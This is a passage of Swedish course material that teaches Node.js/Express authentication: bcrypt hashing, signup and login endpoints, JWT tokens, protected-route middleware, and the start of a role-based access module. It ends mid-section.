# Period 3: Autentisering & Säkerhet

**Vecka 7-9 | Moduler 4-8**

---

## 📋 Innehåll

### Vecka 7: Användarhantering
- **Modul 4:** Användarregistrering med bcrypt
- **Modul 5:** Login & JWT

### Vecka 8: Authorization
- **Modul 6:** Protected Routes & Middleware
- **Modul 7:** Role-based Access Control

### Vecka 9: Säkerhet
- **Modul 8:** Säkerhetsåtgärder (helmet, rate limiting, sanitization)

---

## 🎓 Lärandemål - Period 3

Efter denna period kan du:
- ✅ Hasha lösenord säkert med bcrypt
- ✅ Implementera användarregistrering
- ✅ Skapa login med JWT tokens
- ✅ Bygga protected routes med middleware
- ✅ Implementera roller (user, admin, moderator)
- ✅ Skydda ditt API mot vanliga attacker
- ✅ Validera och sanitera input
- ✅ Implementera rate limiting

---

# 📚 Modul 4: Användarregistrering med bcrypt (Vecka 7 - Lektion 1)

## 🎓 Lärandemål
- Förstå varför vi ALDRIG lagrar lösenord i klartext
- Lära sig vad hashing är
- Implementera bcrypt för säker lösenordshantering
- Skapa signup endpoint

---

## 📖 Teori: Varför inte klartext? (15 min)

### Scenario: Databas läcker (händer ofta!)

**Med klartext:**
```json
{
  "username": "anna",
  "password": "hemligtLösen123"
}
```
❌ Hackaren ser lösenordet direkt!  
❌ Om Anna använder samma lösenord på andra sidor → alla konton hackade!

**Med hashing:**
```json
{
  "username": "anna",
  "password": "$2b$10$N9qo8uLOickgx2ZMRZoMye..."
}
```
✅ Hackaren ser bara hashen  
✅ Omöjligt att få fram originalslösenordet

---

### Vad är hashing?

Hashing = Envägsfunktion (går inte att reversera)

```
Input: "hemligtLösen123"
↓ Hash-funktion (bcrypt)
Output: "$2b$10$N9qo8uLOickgx2ZMRZoMye..."

Du kan INTE ta hashen och få tillbaka "hemligtLösen123"!
```

**Hur loggar man då in?**

1. User skriver lösenord: "hemligtLösen123"
2. Hash:a det användaren skrev
3. Jämför med hashen i databasen
4. Om lika → rätt lösenord!

```javascript
// Vid registrering:
hash("hemligtLösen123") → "$2b$10$abc..." sparas i DB

// Vid inloggning:
hash("hemligtLösen123") → "$2b$10$abc..." ✅ Matchar!
hash("felaktigt123")    → "$2b$10$xyz..." ❌ Matchar inte!
```

---

### Varför bcrypt?

Det finns många hash-algoritmer (MD5, SHA256, bcrypt, Argon2).

**Bcrypt är bäst för lösenord:**
- **Långsam** (bra! Svårt att brute-force)
- **Salt inbyggt** (varje lösenord får unikt hash)
- **Justerbar svårighetsgrad** (saltRounds)

**Salt exempel:**

Utan salt (DÅLIGT):
```
Anna: "password123" → $2b$10$abc...
Bob:  "password123" → $2b$10$abc... (samma hash!)
```
Hackare ser: "Aha, samma hash = samma lösenord!"

Med salt (bcrypt, BRA):
```
Anna: "password123" + random_salt_1 → $2b$10$abc...
Bob:  "password123" + random_salt_2 → $2b$10$xyz... (olika!)
```
Hackare ser: "Olika hashar, kan inte jämföra"

**SaltRounds:**
- Hur många gånger hashen körs
- Högre = säkrare men långsammare
- **10 rounds** = bra balans (2025)
- Tar ~100ms att hasha (perfekt för login)

---

## ✏️ Övning 12: Auth API - Registrering (45 min)

### Steg 1: Nytt projekt (5 min)

**I VS Code:**

1. Se till att du har GitHub-mappen öppen
2. I Explorer, högerklicka → "New Folder"
3. Döp mappen till `auth-api`
4. Högerklicka på `auth-api` → "Open in Integrated Terminal"

**I Terminal:**

```bash
# Initiera Git
git init
```

**Skapa .gitignore:**

Högerklicka på `auth-api` mappen → New File → `.gitignore`

Innehåll:
```
node_modules/
.env
.DS_Store
```

**Installera paket:**

I Terminal:
```bash
npm init -y
npm install express cors mongoose dotenv bcrypt
npm install nodemon --save-dev
```

**Nya paket:**
- `bcrypt`: För lösenordshashing
- `dotenv`: För att hantera känslig data (API-nycklar)
- `mongoose`: För MongoDB

**Uppdatera package.json:**

Öppna `package.json` i VS Code och lägg till:
```json
{
  "type": "module",
  "scripts": {
    "dev": "nodemon server.mjs"
  }
}
```

---

### Steg 2: Environment variables (.env) (5 min)

Skapa `.env` fil:

```env
PORT=3000
MONGODB_URI=mongodb+srv://DITT_USERNAME:DITT_PASSWORD@cluster.xxxxx.mongodb.net/auth-db?retryWrites=true&w=majority
```

**Viktigt:**
- Byt ut username, password och cluster-namn
- Lägg till `/auth-db` i URI:en (databas-namn)

**Skapa .gitignore:**

```
node_modules/
.env
```

**Varför .env?**
- Känslig data (lösenord, API-nycklar) ska ALDRIG committas till Git
- Varje utvecklare har sin egen `.env` lokalt
- I produktion: olika värden (olika databas, etc.)

---

### Steg 3: Database connection (5 min)

Skapa `db.mjs`:

```javascript
import mongoose from 'mongoose';
import dotenv from 'dotenv';

// Ladda miljövariabler från .env
dotenv.config();

const connectDB = async () => {
  try {
    await mongoose.connect(process.env.MONGODB_URI);
    console.log('✅ MongoDB connected successfully');
    console.log('📊 Database:', mongoose.connection.name);
  } catch (error) {
    console.error('❌ MongoDB connection error:', error.message);
    process.exit(1);
  }
};

// Lyssna på events
mongoose.connection.on('disconnected', () => {
  console.log('⚠️  MongoDB disconnected');
});

export default connectDB;
```

**Förklaring:**

```javascript
dotenv.config();
```
Läser `.env` filen och gör variabler tillgängliga via `process.env.VARIABEL_NAMN`

```javascript
process.exit(1);
```
Om databas-koppling misslyckas → avsluta programmet (vi kan inte köra utan databas!)

---

### Steg 4: User model med bcrypt (15 min)

Skapa `models/User.mjs`:

```javascript
import mongoose from 'mongoose';
import bcrypt from 'bcrypt';

const userSchema = new mongoose.Schema(
  {
    username: {
      type: String,
      required: [true, 'Username is required'],
      unique: true,
      trim: true,
      minlength: [3, 'Username must be at least 3 characters'],
      maxlength: [20, 'Username cannot exceed 20 characters']
    },
    email: {
      type: String,
      required: [true, 'Email is required'],
      unique: true,
      trim: true,
      lowercase: true,
      match: [/^\S+@\S+\.\S+$/, 'Please enter a valid email']
    },
    password: {
      type: String,
      required: [true, 'Password is required'],
      minlength: [6, 'Password must be at least 6 characters']
    }
  },
  {
    timestamps: true
  }
);

/**
 * Pre-save hook: Körs INNAN user sparas
 * Hashar lösenordet automatiskt
 */
userSchema.pre('save', async function(next) {
  // Om lösenordet inte ändrats, hoppa över hashing
  if (!this.isModified('password')) {
    return next();
  }
  
  try {
    // Generera salt
    const salt = await bcrypt.genSalt(10);
    
    // Hasha lösenordet med salt
    this.password = await bcrypt.hash(this.password, salt);
    
    next();
  } catch (error) {
    next(error);
  }
});

/**
 * Instance method: Jämför lösenord vid login
 */
userSchema.methods.comparePassword = async function(candidatePassword) {
  try {
    return await bcrypt.compare(candidatePassword, this.password);
  } catch (error) {
    throw error;
  }
};

const User = mongoose.model('User', userSchema);

export default User;
```

**Förklaring detaljerat:**

**Pre-save hook:**
```javascript
userSchema.pre('save', async function(next) {
  // Körs AUTOMATISKT innan .save() eller .create()
})
```

Detta är "middleware" för Mongoose. Det körs:
- Innan `User.create({...})`
- Innan `user.save()`

**Varför?**
- Vi vill hasha lösenordet INNAN det sparas
- Användaren skickar: "hemligtLösen123"
- Vi sparar: "$2b$10$N9qo8uLOickgx2ZMRZoMye..."

**this.isModified('password'):**
```javascript
if (!this.isModified('password')) {
  return next();
}
```

**Scenario 1:** User uppdaterar email
```javascript
user.email = 'new@email.com';
await user.save();
// password inte ändrat → HOPPA ÖVER hashing
```

**Scenario 2:** User byter lösenord
```javascript
user.password = 'newPassword123';
await user.save();
// password ändrat → HASHA det nya lösenordet
```

**bcrypt.genSalt(10):**
```javascript
const salt = await bcrypt.genSalt(10);
```
- Genererar slumpmässig salt
- `10` = saltRounds (antal iterationer)
- Tar ~100ms (perfekt balans)

**bcrypt.hash():**
```javascript
this.password = await bcrypt.hash(this.password, salt);
```
- Input: "hemligtLösen123" + salt
- Output: "$2b$10$N9qo8uLOickgx2ZMRZoMye..."
- Ersätter `this.password` med hashen

**Instance method - comparePassword:**
```javascript
userSchema.methods.comparePassword = async function(candidatePassword) {
  return await bcrypt.compare(candidatePassword, this.password);
}
```

Användning:
```javascript
const user = await User.findOne({ email });
const isMatch = await user.comparePassword("userTypedPassword");
// true om rätt, false om fel
```

**bcrypt.compare():**
```javascript
await bcrypt.compare("hemligtLösen123", "$2b$10$abc...")
```
1. Extraherar salt från hashen
2. Hashar det inskrivna lösenordet med samma salt
3. Jämför hasharna
4. Returnerar true/false

---

### Steg 5: Server setup (5 min)

Skapa `server.mjs`:

```javascript
import app from './app.mjs';
import connectDB from './db.mjs';

const PORT = process.env.PORT || 3000;

// Koppla till databas FÖRST
connectDB().then(() => {
  // Starta servern EFTER databas-koppling
  app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
  });
});
```

**Viktigt:**
```javascript
connectDB().then(() => {
  app.listen(PORT, ...);
});
```
Vi startar servern FÖRST efter databas-kopplingen lyckats.

---

### Steg 6: Signup endpoint (10 min)

Skapa `app.mjs`:

```javascript
import express from 'express';
import cors from 'cors';
import User from './models/User.mjs';

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

/**
 * POST /auth/signup - Registrera ny användare
 */
app.post('/auth/signup', async (req, res) => {
  try {
    const { username, email, password } = req.body;
    
    // Validera att alla fält finns
    if (!username || !email || !password) {
      return res.status(400).json({
        success: false,
        message: 'Username, email and password are required'
      });
    }
    
    // Kolla om user redan finns
    const existingUser = await User.findOne({
      $or: [{ email }, { username }]
    });
    
    if (existingUser) {
      return res.status(400).json({
        success: false,
        message: 'User already exists with that email or username'
      });
    }
    
    // Skapa user (lösenordet hashas automatiskt!)
    const user = await User.create({
      username,
      email,
      password  // Klartextlösenord här, men sparas som hash!
    });
    
    // Returnera user UTAN password
    const userResponse = {
      _id: user._id,
      username: user.username,
      email: user.email,
      createdAt: user.createdAt
    };
    
    res.status(201).json({
      success: true,
      message: 'User created successfully',
      data: userResponse
    });
    
  } catch (error) {
    console.error('Signup error:', error);
    
    // Hantera valideringsfel från Mongoose
    if (error.name === 'ValidationError') {
      const messages = Object.values(error.errors).map(err => err.message);
      return res.status(400).json({
        success: false,
        errors: messages
      });
    }
    
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

export default app;
```

**Förklaring:**

**$or operator:**
```javascript
await User.findOne({
  $or: [{ email }, { username }]
})
```
Hitta user där email ELLER username matchar.

**Varför kolla om user finns?**
- Även om vi har `unique: true` i schema
- Ger bättre felmeddelande
- Undviker MongoDB duplicate key error

**Lösenordet hashas automatiskt:**
```javascript
const user = await User.create({
  password  // "hemligtLösen123"
});
// I DB: "$2b$10$..."
```
Pre-save hook körs automatiskt!

**Returnera ALDRIG password:**
```javascript
const userResponse = {
  _id: user._id,
  username: user.username,
  email: user.email
  // INGET password!
};
```

---

### Steg 7: Testa i Postman (10 min)

**Starta servern:**
```bash
npm run dev
```

**Förväntat i console:**
```
✅ MongoDB connected successfully
📊 Database: auth-db
🚀 Server running on http://localhost:3000
```

---

**Test 1: Signup med giltig data**

```
POST http://localhost:3000/auth/signup

Body (JSON):
{
  "username": "anna",
  "email": "anna@test.com",
  "password": "password123"
}
```

**Response:**
```json
{
  "success": true,
  "message": "User created successfully",
  "data": {
    "_id": "65a1b2c3d4e5f6g7h8i9j0k1",
    "username": "anna",
    "email": "anna@test.com",
    "createdAt": "2025-01-20T10:00:00.000Z"
  }
}
```

**Status:** 201 Created ✅

**Kolla i MongoDB Atlas:**
1. Gå till Collections
2. Database: `auth-db`
3. Collection: `users`
4. Se användarens dokument
5. Password är en lång hash! ✅

---

**Test 2: Duplicate username**

```
POST http://localhost:3000/auth/signup

Body:
{
  "username": "anna",
  "email": "anna2@test.com",
  "password": "password123"
}
```

**Response:**
```json
{
  "success": false,
  "message": "User already exists with that email or username"
}
```

**Status:** 400 Bad Request ✅

---

**Test 3: Validering - för kort username**

```
POST http://localhost:3000/auth/signup

Body:
{
  "username": "ab",
  "email": "test@test.com",
  "password": "password123"
}
```

**Response:**
```json
{
  "success": false,
  "errors": [
    "Username must be at least 3 characters"
  ]
}
```

---

**Test 4: Validering - ogiltig email**

```
POST http://localhost:3000/auth/signup

Body:
{
  "username": "test",
  "email": "invalid-email",
  "password": "password123"
}
```

**Response:**
```json
{
  "success": false,
  "errors": [
    "Please enter a valid email"
  ]
}
```

---

**Test 5: Saknat fält**

```
POST http://localhost:3000/auth/signup

Body:
{
  "username": "test"
}
```

**Response:**
```json
{
  "success": false,
  "message": "Username, email and password are required"
}
```

---

### ✅ Kontrollera:
- [ ] User kan registrera sig
- [ ] Lösenord hashas automatiskt (se i MongoDB Atlas)
- [ ] Password returneras INTE i response
- [ ] Duplicate username/email blockeras
- [ ] Validering fungerar (username length, email format, password length)
- [ ] Servern kopplar till MongoDB utan fel

---

## 🏠 Hemuppgift - Del 1 (Vecka 7)

**Uppgift:** Förbättra password-validering

**Krav:**
Lägg till custom validator i User model:

Password måste innehålla:
- Minst 8 tecken
- Minst en stor bokstav
- Minst en liten bokstav
- Minst en siffra
- Minst ett specialtecken (!@#$%^&*)

**Tips:**
```javascript
const strongPasswordValidator = (password) => {
  if (password.length < 8) return false;
  if (!/[A-Z]/.test(password)) return false;
  if (!/[a-z]/.test(password)) return false;
  if (!/[0-9]/.test(password)) return false;
  if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) return false;
  return true;
};

// I schema:
password: {
  type: String,
  required: true,
  validate: {
    validator: strongPasswordValidator,
    message: 'Password must contain uppercase, lowercase, number, and special character'
  }
}
```

**Testa:**
- "weak" → Fel
- "Weak123" → Fel (inget specialtecken)
- "Weak123!" → OK ✅

---

# 📚 Modul 5: Login & JWT (Vecka 7 - Lektion 2)

## 🎓 Lärandemål
- Förstå hur login fungerar med hashade lösenord
- Lära sig vad JWT (JSON Web Token) är
- Implementera login endpoint
- Generera och returnera JWT

---

## 📖 Teori: JWT vs Sessions (15 min)

### Problem: Hur vet servern vem som är inloggad?

Efter lyckad login måste servern komma ihåg användaren för framtida requests.

---

### Lösning 1: Sessions (Traditional)

```
User loggar in → Server skapar session i minne/databas
              → Skickar session ID till klienten (cookie)
              
Nästa request → Klient skickar session ID
              → Server kollar session ID i minne/databas
              → "Ah, detta är Anna!"
```

**För- och nackdelar:**
- ✅ Enkel att invalidera (radera session → logout)
- ✅ Kan spara mycket data om användaren
- ❌ Kräver minne/databas (skalar dåligt)
- ❌ Problematiskt med flera servrar

---

### Lösning 2: JWT (Modern approach)

```
User loggar in → Server skapar JWT (innehåller user data)
              → Signerar med hemlig nyckel
              → Skickar till klienten
              
Nästa request → Klient skickar JWT
              → Server verifierar signatur
              → "Ah, detta är Anna!"
```

**För- och nackdelar:**
- ✅ Stateless (ingen databas-lookup)
- ✅ Skalar bra (fungerar med flera servrar)
- ✅ Kan innehålla data (user id, role, etc.)
- ❌ Svårare att invalidera
- ❌ Kan bli stor

**Vi använder JWT i denna kurs!**

---

### Vad är en JWT?

En JWT består av 3 delar, separerade med punkt:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NSJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
         Header (base64)                   Payload (base64)    Signature (hashed)
```

---

**1. Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
Vilken algoritm som används.

---

**2. Payload:**
```json
{
  "userId": "12345",
  "username": "anna",
  "iat": 1642425600,
  "exp": 1643030400
}
```
- Data om användaren
- `iat` = issued at (när token skapades)
- `exp` = expiration (när token går ut)

---

**3. Signature:**
```javascript
HMACSHA256(
  base64(header) + "." + base64(payload),
  secret
)
```
Hashar header + payload med hemlig nyckel.

---

### Säkerhet

**VIKTIGT:**
- Payload är INTE krypterad (bara base64)
- Vem som helst kan läsa innehållet på jwt.io
- MEN: Ingen kan ÄNDRA innehållet utan att signatur blir ogiltig
- **Lagra ALDRIG känslig data i JWT!** (lösenord, personnummer)

**Bra att lagra:**
- userId
- username
- email
- role

**INTE bra att lagra:**
- password
- SSN
- kreditkort

---

## ✏️ Fortsättning Övning 12: Login (45 min)

### Steg 1: Installera jsonwebtoken (5 min)

```bash
npm install jsonwebtoken
```

**Uppdatera .env:**
```env
PORT=3000
MONGODB_URI=mongodb+srv://...
JWT_SECRET=your_super_secret_key_min_32_chars_long_random_string
JWT_EXPIRE=7d
```

**JWT_SECRET:**
- Används för att signera tokens
- Måste vara hemlig! (Aldrig committa)
- Lång och slumpmässig

**Generera säker JWT_SECRET:**
```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

**JWT_EXPIRE:**
- Hur länge token är giltig
- `7d` = 7 dagar
- `24h` = 24 timmar
- `30m` = 30 minuter

---

### Steg 2: JWT utility functions (10 min)

Skapa `utils/jwt.mjs`:

```javascript
import jwt from 'jsonwebtoken';

/**
 * Generera JWT för en användare
 * @param {Object} user - User document från MongoDB
 * @returns {string} JWT token
 */
export const generateToken = (user) => {
  const payload = {
    userId: user._id,
    username: user.username,
    email: user.email
  };
  
  const token = jwt.sign(
    payload,
    process.env.JWT_SECRET,
    { expiresIn: process.env.JWT_EXPIRE }
  );
  
  return token;
};

/**
 * Verifiera JWT token
 * @param {string} token - JWT token att verifiera
 * @returns {Object} Decoded payload om giltig, null om ogiltig
 */
export const verifyToken = (token) => {
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    return decoded;
  } catch (error) {
    return null;
  }
};
```

**Förklaring:**

**jwt.sign():**
```javascript
jwt.sign(payload, secret, options)
```
- `payload`: Data att inkludera
- `secret`: Hemlig nyckel från .env
- `options`: T.ex. `{ expiresIn: '7d' }`

**jwt.verify():**
```javascript
jwt.verify(token, secret)
```
Kastar error om:
- Signaturen är ogiltig
- Token har gått ut
- Token är trasig

---

### Steg 3: Login endpoint (20 min)

Lägg till i `app.mjs`:

```javascript
import { generateToken } from './utils/jwt.mjs';

/**
 * POST /auth/login - Logga in användare
 */
app.post('/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // Validera att fält finns
    if (!email || !password) {
      return res.status(400).json({
        success: false,
        message: 'Email and password are required'
      });
    }
    
    // Hitta user i databasen
    const user = await User.findOne({ email });
    
    if (!user) {
      // SÄKERHET: Säg INTE om email eller password är fel!
      return res.status(401).json({
        success: false,
        message: 'Invalid credentials'
      });
    }
    
    // Jämför lösenord med hash
    const isPasswordCorrect = await user.comparePassword(password);
    
    if (!isPasswordCorrect) {
      // SÄKERHET: Samma meddelande som ovan!
      return res.status(401).json({
        success: false,
        message: 'Invalid credentials'
      });
    }
    
    // Generera JWT
    const token = generateToken(user);
    
    // Returnera user info + token
    res.status(200).json({
      success: true,
      message: 'Login successful',
      token: token,
      user: {
        _id: user._id,
        username: user.username,
        email: user.email
      }
    });
    
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});
```

**Förklaring:**

**VIKTIGT SÄKERHETSDETALJ:**
```javascript
if (!user) {
  return res.status(401).json({
    message: 'Invalid credentials'  // INTE "Email not found"
  });
}

if (!isPasswordCorrect) {
  return res.status(401).json({
    message: 'Invalid credentials'  // INTE "Wrong password"
  });
}
```

**Varför samma meddelande?**
- Om vi säger "Email not found" → hackare vet att email finns inte
- Om vi säger "Wrong password" → hackare vet att email finns!
- Generiskt meddelande → hackare vet inte vilket som är fel

**401 Unauthorized:**
- Rätt statuskod för login-fel
- INTE 400 (bad request) eller 403 (forbidden)

**comparePassword:**
```javascript
const isPasswordCorrect = await user.comparePassword(password);
```
Använder instance method från User model.

---

### Steg 4: Testa Login (10 min)

**Test 1: Login med korrekt credentials**

```
POST http://localhost:3000/auth/login

Body:
{
  "email": "anna@test.com",
  "password": "password123"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Login successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NWExYjJjM2Q0ZTVmNmc3aDhpOWowazEiLCJ1c2VybmFtZSI6ImFubmEiLCJlbWFpbCI6ImFubmFAdGVzdC5jb20iLCJpYXQiOjE3MDYxMjM0NTYsImV4cCI6MTcwNjcyODI1Nn0.Xx1234567890abcdefghij",
  "user": {
    "_id": "65a1b2c3d4e5f6g7h8i9j0k1",
    "username": "anna",
    "email": "anna@test.com"
  }
}
```

**Status:** 200 OK ✅

**SPARA TOKEN!** Du behöver den i nästa övning.

---

**Test 2: Login med fel password**

```
Body:
{
  "email": "anna@test.com",
  "password": "felaktigt123"
}
```

**Response:**
```json
{
  "success": false,
  "message": "Invalid credentials"
}
```

**Status:** 401 Unauthorized ✅

---

**Test 3: Login med email som inte finns**

```
Body:
{
  "email": "finnsinte@test.com",
  "password": "password123"
}
```

**Response:**
```json
{
  "success": false,
  "message": "Invalid credentials"
}
```

**SAMMA MEDDELANDE!** Säkerhet! ✅

---

**Test 4: Verifiera JWT på jwt.io**

1. Kopiera token från login-responsen
2. Gå till https://jwt.io/
3. Klistra in token i "Encoded" fältet

**Se "Decoded" payload:**
```json
{
  "userId": "65a1b2c3d4e5f6g7h8i9j0k1",
  "username": "anna",
  "email": "anna@test.com",
  "iat": 1706123456,
  "exp": 1706728256
}
```

Du kan läsa innehållet! (Därför: ingen känslig data)

---

### ✅ Kontrollera:
- [ ] Login med korrekt credentials fungerar
- [ ] JWT returneras i response
- [ ] Login med fel credentials ger samma felmeddelande
- [ ] Token kan decodas på jwt.io
- [ ] Token innehåller userId, username, email
- [ ] Token har expiration (exp)

---

## 🏠 Hemuppgift - Del 2 (Vecka 7)

**Uppgift:** Lägg till "Remember me" funktionalitet

**Krav:**
Login endpoint ska acceptera optional `rememberMe` boolean:

```json
{
  "email": "anna@test.com",
  "password": "password123",
  "rememberMe": true
}
```

- Om `rememberMe: true` → token giltig i 30 dagar
- Om `rememberMe: false` eller saknas → token giltig i 24 timmar

**Tips:**
```javascript
const expiration = req.body.rememberMe ? '30d' : '24h';
const token = jwt.sign(payload, secret, { expiresIn: expiration });
```

**Testa:**
- Login med rememberMe: true
- Kolla exp på jwt.io (ska vara 30 dagar fram)

---

# 📚 Modul 6: Protected Routes & Middleware (Vecka 8 - Lektion 1)

## 🎓 Lärandemål
- Förstå vad middleware är
- Skapa auth middleware
- Implementera protected routes
- Använda req.user

---

## 📖 Teori: Middleware (10 min)

### Vad är middleware?

Middleware = Funktion som körs MELLAN request och response

```
Client → Request → Middleware 1 → Middleware 2 → Endpoint → Response → Client
                   ↓              ↓              ↓
                   Logga          Autentisera    Hantera request
```

**Exempel:**
```javascript
// Middleware-funktion
const logger = (req, res, next) => {
  console.log(`${req.method} ${req.path}`);
  next(); // GÅ VIDARE till nästa middleware
};

// Använd för alla routes
app.use(logger);

// Nu loggas varje request!
```

**next():**
- Anropar nästa middleware i kedjan
- Om du INTE kallar `next()` → request hänger!

---

### Auth Middleware flöde

```
Client → Request + JWT → Auth Middleware → Endpoint
                         ↓
                         1. Finns JWT?
                         2. Är JWT giltig?
                         3. Finns user?
                         ↓
                         Ja → req.user = user → next()
                         Nej → 401 error
```

---

## ✏️ Övning 13: Protected Profile Endpoint (50 min)

### Steg 1: Auth middleware (20 min)

Skapa `middleware/auth.mjs`:

```javascript
import { verifyToken } from '../utils/jwt.mjs';
import User from '../models/User.mjs';

/**
 * Middleware: Kräver inloggning
 * Verifierar JWT och lägger till user i req.user
 */
export const requireAuth = async (req, res, next) => {
  try {
    // 1. Hämta token från Authorization header
    const authHeader = req.headers.authorization;
    
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({
        success: false,
        message: 'No token provided'
      });
    }
    
    // 2. Extrahera token (ta bort "Bearer " prefix)
    const token = authHeader.split(' ')[1];
    
    // 3. Verifiera token
    const decoded = verifyToken(token);
    
    if (!decoded) {
      return res.status(401).json({
        success: false,
        message: 'Invalid or expired token'
      });
    }
    
    // 4. Hämta user från databasen
    const user = await User.findById(decoded.userId).select('-password');
    
    if (!user) {
      return res.status(401).json({
        success: false,
        message: 'User not found'
      });
    }
    
    // 5. Lägg till user i request object
    req.user = user;
    
    // 6. Fortsätt till endpoint
    next();
    
  } catch (error) {
    console.error('Auth middleware error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
};
```

**Förklaring:**

**Authorization header:**
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
               ^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
               typ    token
```

Standard format för JWT.

**Extrahera token:**
```javascript
const authHeader = req.headers.authorization;
// "Bearer eyJhbGc..."

const token = authHeader.split(' ')[1];
// "eyJhbGc..."
```

**select('-password'):**
```javascript
User.findById(decoded.userId).select('-password')
```
Hämta user men EXKLUDERA password field.

**req.user:**
```javascript
req.user = user;
```
Lägg till user i request object. Nu kan endpoint komma åt user!

---

### Steg 2: Profile endpoints (20 min)

Lägg till i `app.mjs`:

```javascript
import { requireAuth } from './middleware/auth.mjs';

/**
 * GET /auth/me - Hämta inloggad användares profil
 * PROTECTED: Kräver JWT token
 */
app.get('/auth/me', requireAuth, async (req, res) => {
  try {
    // req.user finns tack vare requireAuth middleware!
    res.status(200).json({
      success: true,
      data: req.user
    });
  } catch (error) {
    console.error('Get profile error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

/**
 * PATCH /auth/me - Uppdatera profil
 * PROTECTED: Kräver JWT token
 */
app.patch('/auth/me', requireAuth, async (req, res) => {
  try {
    const { username } = req.body;
    
    if (!username) {
      return res.status(400).json({
        success: false,
        message: 'Username is required'
      });
    }
    
    // Kolla om username redan används av annan user
    const existing = await User.findOne({
      username,
      _id: { $ne: req.user._id }  // Exkludera nuvarande user
    });
    
    if (existing) {
      return res.status(400).json({
        success: false,
        message: 'Username already taken'
      });
    }
    
    // Uppdatera user
    req.user.username = username;
    await req.user.save();
    
    res.status(200).json({
      success: true,
      message: 'Profile updated',
      data: req.user
    });
    
  } catch (error) {
    console.error('Update profile error:', error);
    
    if (error.name === 'ValidationError') {
      const messages = Object.values(error.errors).map(err => err.message);
      return res.status(400).json({
        success: false,
        errors: messages
      });
    }
    
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});

/**
 * DELETE /auth/me - Radera konto
 * PROTECTED: Kräver JWT token + lösenord
 */
app.delete('/auth/me', requireAuth, async (req, res) => {
  try {
    const { password } = req.body;
    
    if (!password) {
      return res.status(400).json({
        success: false,
        message: 'Password required to delete account'
      });
    }
    
    // Hämta user med password (req.user har inte password)
    const user = await User.findById(req.user._id);
    
    // Bekräfta lösenord
    const isPasswordCorrect = await user.comparePassword(password);
    
    if (!isPasswordCorrect) {
      return res.status(401).json({
        success: false,
        message: 'Incorrect password'
      });
    }
    
    // Radera user
    await User.findByIdAndDelete(req.user._id);
    
    res.status(200).json({
      success: true,
      message: 'Account deleted successfully'
    });
    
  } catch (error) {
    console.error('Delete account error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error'
    });
  }
});
```

**Förklaring:**

**Middleware som parameter:**
```javascript
app.get('/auth/me', requireAuth, async (req, res) => {
                    ^^^^^^^^^^^
                    Middleware körs FÖRST
```

**Flöde:**
1. Request kommer
2. `requireAuth` körs
3. Om token giltig → `req.user` sätts → `next()` kallas
4. Endpoint-funktionen körs
5. Response skickas

**$ne operator:**
```javascript
{
  username: 'anna',
  _id: { $ne: req.user._id }
}
```
Hitta user där username är 'anna' OCH _id INTE är nuvarande user's _id.

---

### Steg 3: Testa Protected Routes (10 min)

**Test 1: GET /auth/me UTAN token**

```
GET http://localhost:3000/auth/me

(Ingen Authorization header)
```

**Response:**
```json
{
  "success": false,
  "message": "No token provided"
}
```

**Status:** 401 Unauthorized ✅

---

**Test 2: GET /auth/me MED token**

```
GET http://localhost:3000/auth/me

Headers:
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**I Postman:**
1. Gå till "Headers" tab
2. Lägg till:
   - Key: `Authorization`
   - Value: `Bearer DIN_TOKEN_HÄR`

**Response:**
```json
{
  "success": true,
  "data": {
    "_id": "65a1b2c3d4e5f6g7h8i9j0k1",
    "username": "anna",
    "email": "anna@test.com",
    "createdAt": "2025-01-20T10:00:00.000Z"
  }
}
```

**Status:** 200 OK ✅

---

**Test 3: PATCH /auth/me - Uppdatera username**

```
PATCH http://localhost:3000/auth/me

Headers:
Authorization: Bearer DIN_TOKEN

Body:
{
  "username": "anna_updated"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Profile updated",
  "data": {
    "_id": "65a1b2c3d4e5f6g7h8i9j0k1",
    "username": "anna_updated",
    "email": "anna@test.com"
  }
}
```

---

**Test 4: DELETE /auth/me - Radera konto**

```
DELETE http://localhost:3000/auth/me

Headers:
Authorization: Bearer DIN_TOKEN

Body:
{
  "password": "password123"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Account deleted successfully"
}
```

**Verifiera:** Försök GET /auth/me igen → 401 "User not found"

---

### ✅ Kontrollera:
- [ ] Protected routes kräver JWT token
- [ ] Utan token → 401 error
- [ ] Med giltig token → req.user finns
- [ ] Profil kan hämtas
- [ ] Profil kan uppdateras
- [ ] Konto kan raderas (med lösenord)

---

# 📚 Modul 7: Role-based Access Control (Vecka 8 - Lektion 2)

## 🎓 Lärandemål
- Förstå roller (user, admin, moderator)
- Implementera role-based authorization
- Skapa admin-only endpoints

---

## 📖 Teori: Authorization vs Authentication (10 min)

### Authentication (Autentisering)
- **"Vem är du?"**
- Login, verifiera identitet
- JWT, sessions, lösenord

### Authorization (Auktorisering)
- **"Vad får du göra?"**
- Permissions, roller
- Admin, user, moderator

**Exempel:**
